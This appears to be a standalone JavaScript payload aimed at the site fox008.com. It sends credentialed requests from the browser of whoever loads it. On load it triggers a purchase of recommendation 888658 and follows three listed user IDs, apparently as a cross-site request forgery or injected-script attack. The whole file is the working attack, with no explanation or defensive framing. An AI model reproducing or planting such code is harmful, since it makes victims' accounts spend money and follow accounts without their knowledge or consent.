function url_buy(recommendId)
{
 return "http://www.fox008.com/YP/recommend/buy?t="+String(new Date().getTime())+"&recommendId="+recommendId+"&request_token="+String(new Date().getTime());
}
function url_follow(userid)
{
	return "http://www.fox008.com/user/follow?t="+String(new Date().getTime())+"&userId="+userid+"&type=&request_token="+String(new Date().getTime());
}
function buy(recommendId)
{
	var xmlhttp;
	if (window.XMLHttpRequest)
  	{// code for IE7+, Firefox, Chrome, Opera, Safari
  		xmlhttp=new XMLHttpRequest();
  	}
	else
  	{// code for IE6, IE5
  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  	}
	xmlhttp.withCredentials = true;
	xmlhttp.open("POST",url_buy(recommendId),true);
	xmlhttp.send(null);
}
function follow(userid)
{
	var xmlhttp;
	if (window.XMLHttpRequest)
  	{// code for IE7+, Firefox, Chrome, Opera, Safari
  		xmlhttp=new XMLHttpRequest();
  	}
	else
  	{// code for IE6, IE5
  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  	}
	xmlhttp.withCredentials = true;
	xmlhttp.open("GET",url_follow(userid),true);
	xmlhttp.send(null);
}

buy("888658");
follow("137536");
follow("140665");
follow("176940");